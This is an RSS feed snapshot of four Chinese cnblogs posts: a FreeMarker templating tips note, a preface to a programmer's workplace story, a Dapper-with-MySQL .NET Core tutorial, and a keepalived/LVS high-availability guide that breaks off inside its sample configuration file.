<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>在HTML代码中使用freemarker - GJQUser</title>
<link>http://www.cnblogs.com/gjq1126-web/p/9736136.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/gjq1126-web/p/9736136.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;在HTML代码中使用freemarker&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;1、freemarker中显示某对象的属性使用${user.name}.&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;但如果name为null，freemarker就会报错。如果需要判断对象是否为空：&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;#if name??&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;.....&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;/#if&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;当然也可以通过设置默认值&lt;span&gt;&lt;strong&gt;${name!''}&lt;/strong&gt;&lt;/span&gt;来避免对象为空的错误。&lt;strong&gt;&lt;span&gt;如果name为空，就以默认值（“!”后的字符）显示&lt;/span&gt;&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;对象user，name为user的属性的情况，user，name都有可能为空，那么可以写成&lt;span&gt;&lt;strong&gt;${(user.name)!''}&lt;/strong&gt;,表示user或者name为null，都显示为空&lt;/span&gt;。&lt;/p&gt;
&lt;p&gt;判断为空：&lt;span&gt;&lt;strong&gt;&amp;lt;#if (user.name)??&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;……&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;/#if&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;2、&lt;/strong&gt;freemarker中截取字符串&lt;strong&gt;-------------------------------------&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;类型一：&lt;br/&gt;&lt;strong&gt;&lt;span&gt;&amp;lt;#if item.contents??&amp;gt;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;　　&amp;lt;#if item.contents?length gt 7&amp;gt;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;　　　　${item.contents?substring(0,3)}****${item.contents?substring(7,item.contents?length)}&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;　　&amp;lt;#else&amp;gt;${item.contents!}&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;　　&amp;lt;/#if&amp;gt;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;&amp;lt;/#if&amp;gt;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;类型二：&lt;br/&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;#if item.contents??&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　&amp;lt;#if item.contents?length gt 7&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　　　${item.contents?substring(0,7)}****&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　&amp;lt;#else&amp;gt;${item.contents!}&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　&amp;lt;/#if&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;/#if&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;#if item.createTime??&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　&amp;lt;#if item.createTime?length gt 0&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　　　${item.createTime?substring(0,10)}&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　&amp;lt;#else&amp;gt;${item.createTime!''}&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　&amp;lt;/#if&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;/#if&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;strong&gt;&amp;lt;div title=&quot;${item.title!''}&quot;&amp;gt;${item.title?substring(0,9)}...&amp;lt;/div&amp;gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;3、根据条件显示&lt;strong&gt;-------------------------------------&lt;/strong&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;&amp;lt;td class=&quot;th18&quot;&amp;gt;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;　　&amp;lt;#if item.type?? &amp;amp;&amp;amp; item.type ==&quot;0&quot;&amp;gt;天&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;　　&amp;lt;#elseif item.type?? &amp;amp;&amp;amp; item.type ==&quot;1&quot;&amp;gt;**&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;　　&amp;lt;#elseif item.type?? &amp;amp;&amp;amp; item.type ==&quot;2&quot;&amp;gt;**&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;　　&amp;lt;#elseif item.type?? &amp;amp;&amp;amp; item.type ==&quot;3&quot;&amp;gt;**&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;　　&amp;lt;#elseif item.type?? &amp;amp;&amp;amp; item.type ==&quot;4&quot;&amp;gt;**&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;　　&amp;lt;/#if&amp;gt;&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;span&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;4、freemark控制class样式-------------------------------------&lt;/span&gt;&lt;/strong&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;li class=&quot;biao-new &amp;lt;#if userConf??&amp;amp;&amp;amp;userConf.mothShortMark==1&amp;gt;active&amp;lt;/#if&amp;gt;&quot;&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;5、遍历  list  或者  page&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;#if &lt;strong&gt;list  &lt;/strong&gt;?? &amp;amp;&amp;amp; &lt;strong&gt;list  &lt;/strong&gt;?size gt 0&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　&amp;lt;#list channels as item&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　　　&amp;lt;option value=&quot;${item.id!}&quot;&amp;gt;${item.channelName!}&amp;lt;/option&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;　　&amp;lt;/#list&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;strong&gt;&amp;lt;/#if&amp;gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Mon, 01 Oct 2018 15:44:00 +0000</pubDate>
<dc:creator>GJQUser</dc:creator>
<og:description>在HTML代码中使用freemarker 1、freemarker中显示某对象的属性使用${user.name}. 但如果name为null，freemarker就会报错。如果需要判断对象是否为空：</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/gjq1126-web/p/9736136.html</dc:identifier>
</item>
<item>
<title>在国企的日子(序言) - 心灵之火</title>
<link>http://www.cnblogs.com/dgcjiayou/p/9736042.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/dgcjiayou/p/9736042.html</guid>
<description>&lt;p&gt;阿玲是我隔壁邻居的小孩，目前正在读高中。&lt;br/&gt;一天上午，我在书房正准备写点东西，但是整体框架还没想好，中间写写停停，时不时仰望着天花板出神。&lt;br/&gt;阿玲走进来，是又想找我借书看的，我的书架上总有三排，第一排是计算机软件开发方面的书籍，第二排是哲学，心理学方面的书籍，第三排是小说故事方面的书籍，她很喜欢我书架上第三排的书籍，那里大多都是一些她这个年龄爱看的书籍，她借的最多的是琼瑶，三毛和张爱玲的小说，偶尔也会借一些鲁迅，沈从文之类的，她经常憨笑的说道，叔叔你的书架上第三排的书籍都是国宝哦，现在网上找些这样的书籍都很难呢。然后经常问我，为什么第一排的书籍和第二排的书籍不断在增加，第三排的书籍自从她进这个书房就没看见增加过。&lt;br/&gt;我不知道如何解释，就半开玩笑的说道， 叔叔现在靠第一排的书籍在养家糊口哦，第二排书籍是叔叔心灵上的慰藉，年纪越大就越需要。第三排的书籍其实叔叔也只是偶尔翻翻了，已经沉不下心从头看到尾了。&lt;br/&gt;阿玲看到我在写东西，很好奇的问道，“您在写什么呢？”&lt;br/&gt;“在构思一个故事。”我答道。&lt;br/&gt;“是什么类型的故事呵？”阿玲又问。&lt;br/&gt;“是关于程序员的日常工作方面的故事。”我回答道。&lt;br/&gt;“什么是程序员，程序员是什么职业啊？”阿玲不解地问。&lt;br/&gt;“程序员就是，”我顿了一下，发现自己对程序员无法下一个通俗的定义，尤其在不是这个行业内的人面前，自己干了十几年程序员，将来可能还会再干几十年，我突然觉得自己的世界有点狭窄，我干脆放下笔，右手托着腮帮，看着阿玲，微笑反问道：&lt;br/&gt;“你说呢？你觉得程序员会是什么呢？”&lt;br/&gt;阿玲想了想，怯生生地说：“程序员是……，是不是给人配电脑，装操作系统的？”，阿玲的爸爸是一位教师，经常叫我帮他看下电脑，有时候电脑实在卡的不行，我都是通过装操作系统一劳永逸的解决，阿玲对我的职业的定位应该也就在这个阶段。&lt;br/&gt;我苦笑着，摇摇头。&lt;br/&gt;“那程序员是不是帮人做网站，比如我们学校的网站老师可以在上面发布一些公告，班级的信息，这样我们可以看到信息更多更广？”阿玲接着补充。&lt;br/&gt;“嗯，也是，也不全是，但比上一个答案要贴近一些。” 我答道，接着又问阿玲：&lt;br/&gt;“我现在第三排的书籍你差不多读了一半了，后面你还会继续借这上面的书籍，你能告诉我为什么喜欢读这类型的书籍呢？”&lt;br/&gt;“这个啊，我就喜欢看有关爱情的小说，和那些故事情节很丰富的，我就爱好，因为好懂。”&lt;br/&gt;阿玲兴奋的说道。&lt;br/&gt;“那你在哪里上班呢，程序员是不是都是在家工作的？”，阿玲又好奇地问。&lt;br/&gt;“在大多数一线城市。” 我迟疑了一下答道。&lt;br/&gt;“难怪叔叔常年外面跑哦，程序员难道不能像我爸爸那样一辈子只在一个地方工作吗？阿玲突然傻乎乎的问道。&lt;br/&gt;“这个，叔叔这个职业年轻的时候是需要去多磨练的。“我尴尬的答道。&lt;br/&gt;接着我一脸严肃的问阿玲：“如果我写一个关于程序员的故事，你会看吗？“&lt;br/&gt;阿玲皱了皱眉头说：&lt;br/&gt;“如果你写的故事不枯燥，不讲大道理，最好是与爱情有关的，而且内容通俗易懂关于生活方面的，我就会看的。“&lt;br/&gt;说完，阿玲找了本她想看的书走了。&lt;br/&gt;“不枯燥，不讲大道理，最好与爱情有关，内容通俗易懂。“ 我认真记下了阿玲说的话，深深的陷入了沉思。&lt;/p&gt;
&lt;p&gt;阿玲的话让我脑洞大开。&lt;br/&gt;写《在国企的日子》，是我从事软件开发十几年来对程序员生涯的浓缩。&lt;br/&gt;我厌倦了用空洞，抽象的术语来讲解程序某个技术点的原理，我渴望写一个通俗易懂的故事，在引人入胜的情节中，展示程序员日常工作和生活方式，简单来说，我想写一个对IT行业程序员这个职业一无所知的人都想看，也能看懂的故事，做到雅俗共赏，老少皆宜。&lt;br/&gt;那么，该怎么写呢？我陷入了无尽的思索当中。&lt;br/&gt;就在此刻，阿玲进来，并有了上面的一段对话。&lt;br/&gt;我仔细的思考着阿玲说过的话：不枯燥，不讲大道理，最好与爱情有关，内容通俗易懂。其实，阿玲的大白话，不就是程序员的故事吗？程序来源于需求，需求来源于生活，程序员日常的交流和沟通又是人与人时间的情感碰撞，我要把程序员的内心世界赤裸裸的展示在外面，这个就是普通人的阅读取向嘛！&lt;br/&gt;我感到脑子豁然开朗，感觉整体框架已经有了，开始了故事的构思。&lt;br/&gt;《在国企的日子》这个故事，记载了很多年前我在企业的工作经历，为了保护当事人的隐私，我在人名和情节上都做了一些适当的调整和包装。但我没有凭空编造故事，毕竟我不是一个小说家，我只是依据我当初的工作经历，将每个情节的发展稍加情节化的描述。&lt;br/&gt;同时，我这个故事主要定位的是IT界，所以不可避免的会加入一些项目上的专业话题，我都尽量去通俗和简洁，我不会引入代码，但是会将架构设计思想更加明朗化，让大家看故事的同时也有实际内容可共鸣。&lt;br/&gt;在写故事中，我还加入了一些自己对哲学，心理学，人性价值观的感悟和体会，并就一些内容做了些详细的分析。以增进读者的了解，我会将毕生所了解的，都通过这个故事有意无意的去展现，同时自己也在反省和思考着生命的意义是什么，希望能结有缘人进一步成长。&lt;br/&gt;这个就是本故事的整体框架。&lt;br/&gt;本书的故事，不可能每篇都是与爱情有关，但是每篇都是与人情有关。&lt;br/&gt;有人说，程序员的生活只是每天和代码打交道，其实我不这么认为，程序员是对精神方面有着高质量的追求，拥有丰富的内心世界，这部分是一般人所看不到的。程序员从某种意义上来讲也是一个艺术家，是人与代码，人与人之间心灵沟通的艺术。&lt;br/&gt;工作十余年来，时常有人问自己，干程序员有没有后悔，还能不能干的动，这个里面除了有焦虑，有恐惧，同时也有收获，有惊喜，我希望将所有的东西都通过《在国企的日子》来表达出来，同时感恩每一个读过这个故事的人，你们的关注就是我写下去的动力，写的不好，我会更加努力。&lt;/p&gt;
</description>
<pubDate>Mon, 01 Oct 2018 15:06:00 +0000</pubDate>
<dc:creator>心灵之火</dc:creator>
<og:description>这章节本应该写在前面，现在补上来也不为晚，主要讲述写这个故事的一些初衷和整体框架。</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/dgcjiayou/p/9736042.html</dc:identifier>
</item>
<item>
<title>.NET Core开发日志——Dapper与MySQL - Ken.W</title>
<link>http://www.cnblogs.com/kenwoo/p/9735964.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kenwoo/p/9735964.html</guid>
<description>&lt;p&gt;Dapper作为.NET生态中广为人知的轻量级ORM类库在.NET Core里仍能被有效利用，并且其不但可以连通SQL Server数据库还提供对其它数据库，比如MySQL的支持。这里试验了一下通过Dapper连接MySQL的方法。&lt;/p&gt;

&lt;p&gt;可以选择直接安装在原生系统中或是Docker里。&lt;br/&gt;&lt;a href=&quot;https://dev.mysql.com/downloads/mysql/&quot;&gt;Official&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://hub.docker.com/_/mysql/&quot;&gt;Docker&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在MySQL中建立两张表。&lt;/p&gt;
&lt;p&gt;city表：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;CREATE TABLE `city` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `Name` char(35) NOT NULL DEFAULT '',
  `CountryCode` char(3) NOT NULL DEFAULT '',
  `District` char(20) NOT NULL DEFAULT '',
  `Population` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`ID`),
  KEY `CountryCode` (`CountryCode`),
  CONSTRAINT `city_ibfk_1` FOREIGN KEY (`CountryCode`) REFERENCES `country` (`code`)
) ENGINE=InnoDB AUTO_INCREMENT=4080 DEFAULT CHARSET=latin1&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;country表：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;CREATE TABLE `country` (
  `Code` char(3) NOT NULL DEFAULT '',
  `Name` char(52) NOT NULL DEFAULT '',
  `Continent` enum('Asia','Europe','North America','Africa','Oceania','Antarctica','South America') NOT NULL DEFAULT 'Asia',
  `Region` char(26) NOT NULL DEFAULT '',
  `SurfaceArea` float(10,2) NOT NULL DEFAULT '0.00',
  `IndepYear` smallint(6) DEFAULT NULL,
  `Population` int(11) NOT NULL DEFAULT '0',
  `LifeExpectancy` float(3,1) DEFAULT NULL,
  `GNP` float(10,2) DEFAULT NULL,
  `GNPOld` float(10,2) DEFAULT NULL,
  `LocalName` char(45) NOT NULL DEFAULT '',
  `GovernmentForm` char(45) NOT NULL DEFAULT '',
  `HeadOfState` char(60) DEFAULT NULL,
  `Capital` int(11) DEFAULT NULL,
  `Code2` char(2) NOT NULL DEFAULT '',
  PRIMARY KEY (`Code`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;应用程序工程中需要添加Dapper以及Mysql.Data类库。&lt;/p&gt;
&lt;p&gt;dotnet add package Dapper&lt;br/&gt;dotnet add package MySql.Data&lt;/p&gt;

&lt;p&gt;编写两个实体类，用于映射city与country表。&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public class CityEntity
{
    public int ID { get; set; }
    public string Name { get; set; }
    public string CountryCode { get; set; }
    public string District { get; set; }
    public int Population { get; set; }
    public CountryEntity Country { get; set; }

    public override string ToString()
    {
        return $&quot;ID: {ID}, Name: {Name}, CountryCode: {CountryCode}, District: {District}, Population: {Population}, Country: {Country}&quot;;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public class CountryEntity
{
    public string Code { get; set; }
    public string Name { get; set; }
    public string Continent { get; set; }
    public string Region { get; set; }
    public decimal SurfaceArea { get; set; }
    public int IndepYear { get; set; }
    public int Population { get; set; }
    public decimal LifeExpectancy { get; set; }
    public decimal GNP { get; set; }
    public decimal GNPOld { get; set; }
    public string LocalName { get; set; }
    public string GovernmentForm { get; set; }
    public string HeadOfState { get; set; }
    public int Capital { get; set; }
    public string Code2 { get; set; }

    public override string ToString()
    {
        return $&quot;Code: {Code}, Name: {Name}, Continent: {Continent}, Region: {Region}, SurfaceArea: {SurfaceArea} &quot;;
    }
}&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;仓库类中新加获取10个城市数据的方法。这里Dapper的Query方法有三个参数，第一个是需要执行的SQL语句，第二个是对象之间的对应关系(这个例子中city与country为一对一关系)，并确定最终返回的对象类型，最后的SplitOn参数会告诉Dapper在结果集中两张表之间以哪个字段进行分界。&lt;/p&gt;
&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;public class CityRepository
{
    public List&amp;lt;CityEntity&amp;gt; Get10Cities()
    {
        List&amp;lt;CityEntity&amp;gt; result;
        using (var conn = new MySqlConnection(&quot;Host=localhost;Port=3306;Database=world;Uid=admin;pwd=admin&quot;))
        {
            var sql = &quot;SELECT * FROM city INNER JOIN country ON city.CountryCode = country.Code LIMIT 10&quot;;
            result = conn.Query&amp;lt;CityEntity, CountryEntity, CityEntity&amp;gt;(sql,
                (city, country) =&amp;gt; { city.Country = country; return city; }, splitOn: &quot;Code&quot;).ToList();
        }

        return result;
    }
}&lt;/code&gt;
&lt;/pre&gt;

&lt;pre class=&quot;csharp&quot;&gt;
&lt;code&gt;static void Main(string[] args)
{
    var repository = new CityRepository();
    var cities = repository.Get10Cities();
    cities.ForEach(e=&amp;gt;{
        System.Console.WriteLine(e);
    });
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;程序运行的结果如下，可以看到成功借助Dapper的力量从MySQL数据库里获取了所需的数据。&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/991496/201810/991496-20181001222633736-786143912.png&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 01 Oct 2018 14:59:00 +0000</pubDate>
<dc:creator>Ken.W</dc:creator>
<og:description>Dapper作为.NET生态中广为人知的轻量级ORM类库在.NET Core里仍能被有效利用，并且其不但可以连通SQL Server数据库还提供对其它数据库，比如MySQL的支持。这里试验了一下通过D</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kenwoo/p/9735964.html</dc:identifier>
</item>
<item>
<title>高可用集群之keepalived+lvs实战-技术流ken - 技术流ken</title>
<link>http://www.cnblogs.com/kenken2018/p/9735947.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kenken2018/p/9735947.html</guid>
<description>&lt;h2&gt;1.keepalived简介&lt;/h2&gt;
&lt;p&gt;lvs在我之前的博客《&lt;a id=&quot;post_title_link_9734382&quot; href=&quot;https://www.cnblogs.com/kenken2018/p/9734382.html&quot;&gt;高负载集群实战之lvs负载均衡-技术流ken&lt;/a&gt;》中已经进行了详细的介绍和应用，在这里就不再赘述。这篇博文将把lvs与keepalived相结合使用，在实际工作中搭建高可用，高负载，高性能的服务器集群。&lt;/p&gt;
&lt;p&gt;“Keepalived的作用是检测服务器的状态，如果有一台web服务器宕机，或工作出现故障，Keepalived将检测到，并将有故障的服务器从系统中剔除，同时使用其他服务器代替该服务器的工作，当服务器工作正常后Keepalived自动将服务器加入到服务器群中，这些工作全部自动完成，不需要人工干涉，需要人工做的只是修复故障的服务器。”&lt;/p&gt;
&lt;h2&gt;2.keepalived的主要功能&lt;/h2&gt;
&lt;h3&gt;1. healthcheck&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;检查后端节点是否正常工作&lt;/p&gt;
&lt;p&gt;如果发现后端节点异常，就将该异常节点从调度规则中删除；&lt;/p&gt;
&lt;p&gt;如果发现后端的异常节点恢复正常了，就将该节点重新加入到调度规则中；&lt;/p&gt;
&lt;h3&gt;2. failover&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;是对调度器的主节点做健康检测。&lt;/p&gt;
&lt;p&gt;将备用节点升级为主节点&lt;/p&gt;
&lt;p&gt;&lt;span&gt;接管主节点上的资源（&lt;/span&gt;vip&lt;span&gt;、&lt;/span&gt;&lt;span&gt;lvs&lt;/span&gt;&lt;span&gt;规则）&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;strong&gt;3.keepalived&lt;span&gt;实现故障切换的原理&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;1.keepalived&lt;span&gt;是基于&lt;/span&gt;&lt;span&gt;vrrp&lt;/span&gt;&lt;span&gt;写于实现的故障切换&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2.&lt;span&gt;正常情况下，主节点会每隔一段时间向备节点发送一个心跳信息，这个就是告诉备节点自己正常&lt;/span&gt; &lt;/p&gt;
&lt;p&gt;&lt;span&gt;当主节点发生故障，那么备节点无法接收都心跳信息，就认定主节点故障，那么就会接收主节点的业务和资源（包括&lt;/span&gt;vip&lt;span&gt;）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;当主节点又恢复的时候，那么备节点释放所接收到资源和业务&lt;/p&gt;
&lt;h2&gt;4.&lt;strong&gt;&lt;span&gt;简单说说&lt;/span&gt;vrrp&lt;span&gt;协议&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;1. VRRP&lt;span&gt;（&lt;/span&gt;&lt;span&gt;(Virtual Router Redundancy Protocol&lt;/span&gt;&lt;span&gt;），虚拟路由冗余协议，为了解决静态路由的单点故障问题&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2. VRRP&lt;span&gt;的工作机制是基于竞选机制选择一个路由来完成任务处理&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;3. VRRP&lt;span&gt;协议是通过发送多播数据包实现竞选的（&lt;/span&gt;&lt;span&gt;Multicat&lt;/span&gt;&lt;span&gt;）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;4. &lt;span&gt;竞选出来主节点会一直发送广播包，&lt;/span&gt;&lt;span&gt;backup&lt;/span&gt;&lt;span&gt;节点一直监听这些广播包（处于监听状态）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;5. &lt;span&gt;当备用节点无法接收到广播包的是时候，就会重新进行竞选，选出一个新的节点作为主节点&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;5.&lt;strong&gt;keepalived&lt;span&gt;可以完成如下工作&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;1. &lt;span&gt;自动生成&lt;/span&gt;&lt;span&gt;vip&lt;/span&gt;&lt;span&gt;（&lt;/span&gt;&lt;span&gt;vip&lt;/span&gt;&lt;span&gt;给用户提供服务）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2. &lt;span&gt;自动配置&lt;/span&gt;&lt;span&gt;lvs&lt;/span&gt;&lt;span&gt;规则&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;3. &lt;span&gt;可以实现各种服务的高可用&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;4. failover&lt;span&gt;的时候，做&lt;/span&gt;&lt;span&gt;vip&lt;/span&gt;&lt;span&gt;的&lt;/span&gt;漂移&lt;/p&gt;
&lt;h2&gt;6.&lt;strong&gt;keepalived&lt;span&gt;的配置文件&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;第一段：global_defs，全局配置段
    global_defs {
       notification_email {
               &lt;/span&gt;&lt;span&gt;237745635&lt;/span&gt;&lt;span&gt;@qq.com
       }
       notification_email_from Alexandre.Cassen@firewall.loc
       smtp_server &lt;/span&gt;&lt;span&gt;192.168&lt;/span&gt;.&lt;span&gt;200.1&lt;/span&gt;&lt;span&gt;
       smtp_connect_timeout &lt;/span&gt;&lt;span&gt;30&lt;/span&gt;&lt;span&gt;
       router_id id1        &lt;/span&gt;&amp;lt;&amp;lt;&amp;lt;&lt;span&gt; 当前主机的ID值，这个值必须是唯一的
    }


第二段：vrrp_instance，实例配置段（虚拟服务段）
    【该段是定义虚拟服务的vip等信息】
    vrrp_instance VI_1 {       &lt;/span&gt;&amp;lt;&amp;lt;&amp;lt;&lt;span&gt; 指定实例的名称
        state MASTER           &lt;/span&gt;&amp;lt;&amp;lt;&amp;lt;&lt;span&gt; 指定节点的状态，MASTER表示主，BACKUP表示备用节点
        &lt;/span&gt;&lt;span&gt;interface&lt;/span&gt; eth0         &amp;lt;&amp;lt;&amp;lt;&lt;span&gt; 指定将VIP绑定在哪个网卡上
        virtual_router_id &lt;/span&gt;&lt;span&gt;51&lt;/span&gt;   &amp;lt;&amp;lt;&amp;lt;&lt;span&gt; 虚拟路由ID，用于标识哪些个节点是一组，同一组的主机的虚拟id需要相同
        priority &lt;/span&gt;&lt;span&gt;100&lt;/span&gt;           &amp;lt;&amp;lt;&amp;lt;&lt;span&gt; 指定该节点的优先级（主这节点的优先级大于备节点）
        advert_int &lt;/span&gt;&lt;span&gt;1&lt;/span&gt;           &amp;lt;&amp;lt;&amp;lt;&lt;span&gt; 指定备节点在几秒之内没有接收到主节点的心跳信息，就接管其业务和资源
        authentication {       &lt;/span&gt;&amp;lt;&amp;lt;&amp;lt;&lt;span&gt; 指定keepalived集群中各个主备节点做认证的方式
            auth_type PASS
            auth_pass &lt;/span&gt;&lt;span&gt;1111&lt;/span&gt;&lt;span&gt;
        }
        virtual_ipaddress {   &lt;/span&gt;&amp;lt;&amp;lt;&amp;lt;&lt;span&gt; 指定用于提供服务的ip地址（也就是VIP）
